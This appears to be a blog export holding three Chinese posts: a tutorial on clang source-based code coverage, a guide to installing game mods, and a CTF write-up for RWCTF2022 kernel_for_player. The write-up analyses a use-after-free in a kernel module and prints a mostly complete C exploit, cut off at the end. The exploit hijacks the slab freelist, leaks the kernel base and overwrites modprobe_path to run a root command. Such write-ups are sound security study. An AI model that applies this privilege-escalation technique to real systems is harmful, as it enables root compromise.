    <title>源码覆盖率统计</title>
    <url>/posts/f2789859.html</url>
    <content><![CDATA[<p>LibFuzzer使用的覆盖率统计工具为Source-based Code Coverage。<br>另外两个clang实现的覆盖率统计实现：</p>
<ul>
<li><a href="https://clang.llvm.org/docs/SanitizerCoverage.html">SanitizerCoverage</a>: 低开销的工具。可以提供边级别的覆盖率统计；</li>
<li>gcov: gcc兼容的覆盖率统计实现，基于DebugInfo。<code>-ftest-coverage</code>和<code>--coverage</code></li>
</ul>
<h2 id="workflow"><a href="#workflow" class="headerlink" title="workflow"></a>workflow</h2><ul>
<li>编译附带覆盖率信息</li>
<li>运行插桩程序</li>
<li>创建覆盖率报告<br>后面以下面的代码为例：<figure class="highlight c"><figcaption><span>ShowLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line">% cat &lt;&lt;EOF &gt; foo.cc</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BAR(x) ((x) || (x))</span></span><br><span class="line">template &lt;typename T&gt; <span class="type">void</span> <span class="title function_">foo</span><span class="params">(T x)</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">unsigned</span> I = <span class="number">0</span>; I &lt; <span class="number">10</span>; ++I) &#123; BAR(I); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  foo&lt;<span class="type">int</span>&gt;(<span class="number">0</span>);</span><br><span class="line">  foo&lt;<span class="type">float</span>&gt;(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="添加覆盖率配置"><a href="#添加覆盖率配置" class="headerlink" title="添加覆盖率配置"></a>添加覆盖率配置</h2><p>加入<code>-fprofile-instr-generate -fcoverage-mapping</code>参数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Step 1: Compile with coverage enabled</span></span><br><span class="line"><span class="meta prompt_">% </span><span class="language-bash">clang++ -fprofile-instr-generate -fcoverage-mapping foo.cc -o foo</span></span><br></pre></td></tr></table></figure>
<p>可以将未加入覆盖率信息插桩的代码与加入的相互链接，只不过未插桩的不会计入覆盖率信息。<br>可以加入<code>-coverage-mcdc</code>参数来添加Modified Condition&#x2F;Decision Coverage(MC&#x2F;DC)覆盖率统计方法。</p>
<h2 id="运行插桩程序"><a href="#运行插桩程序" class="headerlink" title="运行插桩程序"></a>运行插桩程序</h2><p>运行插桩程序，程序退出后会保存raw profile到环境变量<code>LLVM_PROFILE_FILE</code>目录下，默认保存到<code>default.profraw</code>文件。</p>
<h2 id="查看覆盖率报告"><a href="#查看覆盖率报告" class="headerlink" title="查看覆盖率报告"></a>查看覆盖率报告</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Step 3(a): Index the raw profile.</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">llvm-profdata merge -sparse foo.profraw -o foo.profdata</span></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><figcaption><span>showLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line">❯ llvm-cov show ./foo -instr-profile=foo.profdata</span><br><span class="line">    1|       |/*************************************************************************</span><br><span class="line">    2|       |  &gt; File Name: foo.cc</span><br><span class="line">    3|       |  &gt; Author: eutopia</span><br><span class="line">    4|       |  &gt; Mail: 2715417602@qq.com</span><br><span class="line">    5|       |  &gt; Created Time: Mon Aug  4 17:24:37 2025</span><br><span class="line">    6|       | ************************************************************************/</span><br><span class="line">    7|       |</span><br><span class="line">    8|     20|#define BAR(x) ((x) || (x))</span><br><span class="line">    9|      2|template &lt;typename T&gt; void foo(T x) &#123;</span><br><span class="line">   10|     22|  for (unsigned I = 0; I &lt; 10; ++I) &#123; BAR(I); &#125;</span><br><span class="line">   11|      2|&#125;</span><br><span class="line">  ------------------</span><br><span class="line">  | _Z3fooIiEvT_:</span><br><span class="line">  |    9|      1|template &lt;typename T&gt; void foo(T x) &#123;</span><br><span class="line">  |   10|     11|  for (unsigned I = 0; I &lt; 10; ++I) &#123; BAR(I); &#125;</span><br><span class="line">  |   11|      1|&#125;</span><br><span class="line">  ------------------</span><br><span class="line">  | _Z3fooIfEvT_:</span><br><span class="line">  |    9|      1|template &lt;typename T&gt; void foo(T x) &#123;</span><br><span class="line">  |   10|     11|  for (unsigned I = 0; I &lt; 10; ++I) &#123; BAR(I); &#125;</span><br><span class="line">  |   11|      1|&#125;</span><br><span class="line">  ------------------</span><br><span class="line">   12|      1|int main() &#123;</span><br><span class="line">   13|      1|  foo&lt;int&gt;(0);</span><br><span class="line">   14|      1|  foo&lt;float&gt;(0);</span><br><span class="line">   15|      1|  return 0;</span><br><span class="line">   16|      1|&#125;</span><br></pre></td></tr></table></figure>
<p>查看报告：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ llvm-cov report ./foo --instr-profile=foo.profdata</span><br><span class="line">Filename                              Regions    Missed Regions     Cover   Functions  Missed Functions  Executed       Lines      Missed Lines     Cover    Branches   Missed Branches     Cover</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">/home/bronya/test/coverage/foo.cc           8                 0   100.00%           2                 0   100.00%           8                 0   100.00%           6                 1    83.33%</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">TOTAL                                       8                 0   100.00%           2                 0   100.00%           8                 0   100.00%           6                 1    83.33%</span><br></pre></td></tr></table></figure>
<p>后面的不太重要，暂时先不写了，可以阅读源链接<br>注：<br>SanitizerCoverage中关于边(Edge Coverage)的解释</p>
<img src="/posts/f2789859/file-20250804184719356.png" class="">
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://clang.llvm.org/docs/SourceBasedCodeCoverage.html">https://clang.llvm.org/docs/SourceBasedCodeCoverage.html</a></p>
]]></content>
      <categories>
        <category>Fuzz</category>
      </categories>
  </entry>
  <entry>
    <title>鸣潮Mod安装</title>
    <url>/posts/6335cc29.html</url>
    <content><![CDATA[<p>心血来潮.</p>
<h2 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具:"></a>使用工具:</h2><ul>
<li><a href="https://github.com/SpectrumQT/WWMI-Package?tab=readme-ov-file">WWMI</a></li>
</ul>
<h2 id="WWMI"><a href="#WWMI" class="headerlink" title="WWMI"></a>WWMI</h2><p>安装release版本msi，安装后点击鸣潮添加到左上角，然后Install即可</p>
<h3 id="Mod-Installation"><a href="#Mod-Installation" class="headerlink" title="Mod Installation"></a>Mod Installation</h3><ol>
<li><a href="https://support.microsoft.com/en-us/windows/zip-and-unzip-files-f6dde0a7-0fec-8294-e1d3-703ed85e7ebc">Extract</a> mod’s archive</li>
<li>Put extracted folder into the <strong>Mods</strong> folder</li>
</ol>
<h3 id="Mod-Hot-Load"><a href="#Mod-Hot-Load" class="headerlink" title="Mod Hot Load"></a>Mod Hot Load</h3><p>To properly load newly installed mod without restarting the game:</p>
<ol>
<li>Install mod</li>
<li>Hide modded character from screen (switch to another)</li>
<li>Press <strong>[F10]</strong> to reload WWMI</li>
</ol>
<h3 id="Mod-User-Hotkeys"><a href="#Mod-User-Hotkeys" class="headerlink" title="Mod User Hotkeys"></a>Mod User Hotkeys</h3><ul>
<li><strong>[F12]</strong>: Toggle User Guide</li>
<li><strong>[F6]</strong>: Toggle WWMI dependant mods</li>
<li><strong>[F10]</strong>: Reload WWMI and Save Mod Settings</li>
<li><strong>[Alt]+[F12]</strong>: Toggle 0.6.X Compatibility Mode</li>
<li><strong>[Ctrl]+[Alt]+[F10]</strong>: Reset Mod Settings and Reload</li>
</ul>
<h2 id="JASM"><a href="#JASM" class="headerlink" title="JASM"></a>JASM</h2><p>安装release版本，选择mod加载路径为WMMI路径即可。</p>
<p>然后就可以在GameBanana上下载mod了</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://huihui.me/?list_15/70.html">Hui站 Mod安装教程</a></li>
<li><a href="https://github.com/SpectrumQT/XXMI-Launcher?tab=readme-ov-file"><a href="https://github.com/SpectrumQT/XXMI-Launcher">XXMI-Launcher</a></a></li>
<li>[JASM](JASM - 只是又一款皮肤管理器（汉化版）)</li>
</ul>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
  </entry>
  <entry>
    <title>RWCTF2022 kernel_for_player</title>
    <url>/posts/d0620b70.html</url>
    <content><![CDATA[<p>内核堆题基本思路：通过修改free_list的next指针来完成内核空间任意地址分配</p>
<h2 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h2><p>查看开启的保护机制，通过qemu启动脚本可知开启kaslr，smep，smap，查看<code>/sys/devices/system/cpu/vulnerabilities/*</code>内容可知开启PTI保护，或者通过<code>/proc/cpuinfo</code>查看：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/home $ grep flags /proc/cpuinfo -m 1 | grep pti</span><br><span class="line">flags           : fpu de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx lm constant_tsc nopl xtopology cpuid pni cx16 hypervisop</span><br><span class="line">/home $ grep flags /proc/cpuinfo -m 1 | grep smep</span><br><span class="line">flags           : fpu de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx lm constant_tsc nopl xtopology cpuid pni cx16 hypervisop</span><br><span class="line">/home $ grep flags /proc/cpuinfo -m 1 | grep smap</span><br><span class="line">flags           : fpu de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx lm constant_tsc nopl xtopology cpuid pni cx16 hypervisop</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/home $ cat /sys/devices/system/cpu/vulnerabilities/*</span><br><span class="line">Processor vulnerable</span><br><span class="line">Mitigation: PTE Inversion</span><br><span class="line">Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown</span><br><span class="line">Mitigation: PTI</span><br><span class="line">Vulnerable</span><br><span class="line">Mitigation: usercopy/swapgs barriers and __user pointer sanitization</span><br><span class="line">Mitigation: Full generic retpoline, STIBP: disabled, RSB filling</span><br><span class="line">Not affected</span><br></pre></td></tr></table></figure>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>使用ida查看<code>xkmod.ko</code>反汇编逻辑：<br><code>xkmod_init</code>逻辑如下：</p>
<img src="/posts/d0620b70/file-20250808153059355.png" class="">
<p><code>xkmod_init</code>函数初始化xkmod驱动，并使用kmem_cache_create创建了大小为0xc0的kmem_cache堆。<br><code>xkmod_ioctl</code>逻辑如下：</p>
<img src="/posts/d0620b70/file-20250808160906175.png" class="">
<p>arg参数为包裹一个结构体，定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_payload</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> addr;</span><br><span class="line">	<span class="type">int</span> offset;</span><br><span class="line">	<span class="type">int</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数逻辑如下：<br>当cmd为0x1111111时，从init创建的slab缓存中分配kmem_cache到buf；<br>当cmd为0x6666666时，将用户指定user_payload.addr的size写入到buf的指定偏移处；<br>当cmd为0x7777777时，读取buf的指定偏移到用户地址。<br>xkmod_release函数，将buf释放，但是没有对buf置零，因此存在UAF漏洞。</p>
<img src="/posts/d0620b70/file-20250808161415559.png" class="">
<p>还有一个copy_overflow函数，但是没有调用逻辑：</p>
<img src="/posts/d0620b70/file-20250808161350371.png" class="">

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h3><p>先构造一个交互脚本如下:</p>
<figure class="highlight c"><figcaption><span>showLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Kernel Pwn Infrastructures</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS_MSG(msg)    <span class="string">&quot;\033[32m\033[1m[SUCCESS]&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INFO_MSG(msg)       <span class="string">&quot;\033[34m\033[1m[INFO]&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR_MSG(msg)      <span class="string">&quot;\033[31m\033[1m[ERROR]&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_success(msg)    puts(SUCCESS_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(msg)       puts(INFO_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_error(msg)      puts(ERROR_MSG(msg))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// define the payload data pack struct</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Data</span> &#123;</span></span><br><span class="line">	<span class="type">long</span> *ptr;</span><br><span class="line">	<span class="type">int</span> offset;</span><br><span class="line">	<span class="type">int</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">char</span> *test_data = <span class="string">&quot;This is test data&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// initialize payload data</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Data</span> <span class="title">data</span>;</span></span><br><span class="line">	data.ptr = test_data;</span><br><span class="line">	data.offset = <span class="number">0</span>;</span><br><span class="line">	data.size = <span class="number">0x10</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// open device</span></span><br><span class="line">	<span class="type">int</span> fd1 = <span class="number">0</span>, fd2 = <span class="number">0</span>;</span><br><span class="line">	fd1 = open(<span class="string">&quot;/dev/xkmod&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (fd1 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		log_error(<span class="string">&quot;open device1 failed.&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	log_info(<span class="string">&quot;open device1 success&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	fd2 = open(<span class="string">&quot;/dev/xkmod&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (fd2 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		log_error(<span class="string">&quot;open device2 failed.&quot;</span>);</span><br><span class="line">		close(fd1);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	log_info(<span class="string">&quot;open device2 success&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ioctl to interact with xkmod</span></span><br><span class="line">	ioctl(fd1, <span class="number">0x1111111</span>, &amp;data);</span><br><span class="line">	ioctl(fd2, <span class="number">0x1111111</span>, &amp;data);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// write test_data to kernel memory lalala</span></span><br><span class="line">	ioctl(fd1, <span class="number">0x6666666</span>, &amp;data);</span><br><span class="line">	log_info(<span class="string">&quot;write test_data to kmem_cache1 success&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// finish</span></span><br><span class="line">	close(fd1);</span><br><span class="line">	close(fd2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行几次查看是否开启RANDOM_LIST和HARDEN_LIST保护</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第一次运行exp第一次执行kmem_cache_alloc</span></span><br><span class="line">RAX  0xffff8880071b50c0 —▸ 0xffff8880071b53c0 —▸ 0xffff8880071b5540 —▸ 0xffff8880071b5240 —▸ 0xffff8880071b5f00 ◂— ...</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第一次运行exp第二次执行kmem_cache_alloc</span></span><br><span class="line">RAX  0xffff8880071b53c0 —▸ 0xffff8880071b5540 —▸ 0xffff8880071b5240 —▸ 0xffff8880071b5f00 —▸ 0xffff8880071b5d80 ◂— ...</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第一次运行exp执行copy_from_user</span></span><br><span class="line">RSI  0xffff8880071b53c0 ◂— &#x27;This is test dat&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第二次运行exp执行kmem_cache_free</span></span><br><span class="line">RSI  0xffff8880071b53c0 —▸ 0xffff8880071b56c0 —▸ 0xffff8880071b5540 —▸ 0xffff8880071b5240 —▸ 0xffff8880071b5f00 ◂— ...</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第三次运行exp执行kmem_cache_free</span></span><br><span class="line">RSI  0xffff8880071a3480 —▸ 0xffff8880071a3240 —▸ 0xffff8880071a3180 —▸ 0xffff8880071a3e40 —▸ 0xffff8880071a3cc0 ◂— ...</span><br></pre></td></tr></table></figure>
<p>因此说明kmem_cache的offset为0，未开启HARDEN_LIST保护，开启了RANDOM_LIST保护<br>RANDOM_LIST并非运行时保护，其在进入free-list后的顺序是固定的，也就是说free后再次申请的获得的顺序是固定的，那么就可以修改一个uaf的next指针为要申请的地址，再分配一次即可实现任意地址申请，进而实现任意地址读写。<br>这个会引入一个问题，即修改后uaf的next指针为申请的目标地址，当分配uaf的块后，会将目标地址的next指针的8字节数据写入到free-list，此时如果目标地址前8字节指向内容不合法即会导致内核panic，需要前8字节为0，这样kmem_cache会向buddy system请求一个新的slub，这样就不会crash。</p>
<h3 id="泄露内核基址"><a href="#泄露内核基址" class="headerlink" title="泄露内核基址"></a>泄露内核基址</h3><p>在Direct Memory Mapping区域+0x9d000地址存放着内核函数secondary_startup_64的地址，由此可以尝试泄露该函数地址，从而获取内核基址。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">telescope 0xffff888000000000+0x9d000</span></span><br><span class="line">00:0000│  0xffff88800009d000 —▸ 0xffffffff81000030 (secondary_startup_64) ◂— call 0xffffffff810000e0</span><br><span class="line">01:0008│  0xffff88800009d008 ◂— 0x901</span><br><span class="line">02:0010│  0xffff88800009d010 ◂— 0x6b0</span><br><span class="line">03:0018│  0xffff88800009d018 ◂— 0</span><br><span class="line">... ↓     4 skipped</span><br></pre></td></tr></table></figure>

<h3 id="修改modprobe-path"><a href="#修改modprobe-path" class="headerlink" title="修改modprobe_path"></a>修改modprobe_path</h3><p>通过uaf修改modprobe_path地址的内容，然后构造fakefile即可实现任意命令执行：<br>exp如下：</p>
<figure class="highlight c"><figcaption><span>showLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Kernel Pwn Infrastructures</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS_MSG(msg)    <span class="string">&quot;\033[32m\033[1m[+]&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INFO_MSG(msg)       <span class="string">&quot;\033[34m\033[1m[*]&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR_MSG(msg)      <span class="string">&quot;\033[31m\033[1m[x]&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_success(msg)    puts(SUCCESS_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(msg)       puts(INFO_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_error(msg)      puts(ERROR_MSG(msg))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// This is only an example for nokaslr</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEAP_BASE_ADDR		0xffff888000000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNEL_BASE_ADDR	0xffffffff81000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MODPROBE_PATH_ADDR	0xFFFFFFFF82444700</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROOT_SCRIPT_PATH	<span class="string">&quot;/home/getshell&quot;</span></span></span><br><span class="line"><span class="type">char</span> root_cmd[] = <span class="string">&quot;#!/bin/sh\nchmod 777 /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// define the payload data pack struct</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Data</span> &#123;</span></span><br><span class="line">	<span class="type">long</span> *ptr;</span><br><span class="line">	<span class="type">int</span> offset;</span><br><span class="line">	<span class="type">int</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// bind the process to specific core</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bindCore</span><span class="params">(<span class="type">int</span> core)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">	CPU_ZERO(&amp;cpu_set);</span><br><span class="line">	CPU_SET(core, &amp;cpu_set);</span><br><span class="line">	sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">	log_info(<span class="string">&quot;Process binded to core 0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">// fundamental works</span></span><br><span class="line">	bindCore(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> *test_data = <span class="string">&quot;This is test data&quot;</span>;</span><br><span class="line">	<span class="comment">// initialize payload data</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Data</span> <span class="title">data</span>;</span></span><br><span class="line">	data.ptr = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	data.offset = <span class="number">0</span>;</span><br><span class="line">	data.size = <span class="number">0x08</span>;</span><br><span class="line">	<span class="comment">// open device</span></span><br><span class="line">	<span class="type">int</span> fd1 = <span class="number">0</span>, fd2 = <span class="number">0</span>;</span><br><span class="line">	fd1 = open(<span class="string">&quot;/dev/xkmod&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (fd1 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		log_error(<span class="string">&quot;open device1 failed.&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	log_info(<span class="string">&quot;open device1 success&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	fd2 = open(<span class="string">&quot;/dev/xkmod&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (fd2 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		log_error(<span class="string">&quot;open device2 failed.&quot;</span>);</span><br><span class="line">		close(fd1);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	log_info(<span class="string">&quot;open device2 success&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ioctl to interact with xkmod</span></span><br><span class="line">	ioctl(fd1, <span class="number">0x1111111</span>, &amp;data);</span><br><span class="line">	ioctl(fd2, <span class="number">0x1111111</span>, &amp;data);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// construct uaf to alloc kmem_cache in HEAP_BASE_ADDR + 0x9d000</span></span><br><span class="line">	close(fd1);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// read fd1 to leak heap_base_addr</span></span><br><span class="line">	data.ptr = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	ioctl(fd2, <span class="number">0x7777777</span>, &amp;data);</span><br><span class="line">	<span class="type">size_t</span> heap_base_addr = *data.ptr &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Guess Kernel Heap Base Address: 0x%lx\n&quot;</span>, heap_base_addr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// uaf</span></span><br><span class="line">	<span class="type">size_t</span> *fake_chunk = heap_base_addr + <span class="number">0x9d000</span> - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">	data.ptr = &amp;fake_chunk;</span><br><span class="line">	ioctl(fd2, <span class="number">0x6666666</span>, &amp;data);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// alloc twice to get HEAP_BASE_ADDR + 0x9d000</span></span><br><span class="line">	ioctl(fd2, <span class="number">0x1111111</span>, &amp;data);</span><br><span class="line">	ioctl(fd2, <span class="number">0x1111111</span>, &amp;data);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// read address contained by target chunk</span></span><br><span class="line">	data.ptr = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	data.offset = <span class="number">0x10</span>;</span><br><span class="line">	data.size = <span class="number">0x08</span>;</span><br><span class="line">	ioctl(fd2, <span class="number">0x7777777</span>, &amp;data);</span><br><span class="line">	<span class="type">size_t</span> kernel_base_addr = *data.ptr - <span class="number">0x000030</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Kernel Base Address: 0x%lx\n&quot;</span>, *data.ptr - <span class="number">0x000030</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// modify modprobe_path to get root shell</span></span><br><span class="line">	<span class="type">size_t</span> modprobe_path = MODPROBE_PATH_ADDR - KERNEL_BASE_ADDR + kernel_base_addr;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] modprobe_path is 0x%lx\n&quot;</span>, modprobe_path);</span><br><span class="line">	fd1 = open(<span class="string">&quot;/dev/xkmod&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	fd2 = open(<span class="string">&quot;/dev/xkmod&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="type">size_t</span> *fake_chunk1 = modprobe_path - <span class="number">0x10</span>; </span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Data</span> <span class="title">data1</span>;</span></span><br><span class="line">	data1.ptr = &amp;fake_chunk1;</span><br><span class="line">	data1.offset = <span class="number">0</span>;</span><br><span class="line">	data1.size = <span class="number">0x8</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// alloc two new kmem_cache</span></span><br><span class="line">	ioctl(fd1, <span class="number">0x1111111</span>, &amp;data1);</span><br><span class="line">	ioctl(fd2, <span class="number">0x1111111</span>, &amp;data1);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// uaf</span></span><br><span class="line">	close(fd1);</span><br><span class="line">	ioctl(fd2, <span class="number">0x6666666</span>, &amp;data1);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// alloc twice to get modprobe_path</span></span><br><span class="line">	ioctl(fd2, <span class="number">0x1111111</span>, &amp;data1);</span><br><span class="line">	ioctl(fd2, <span 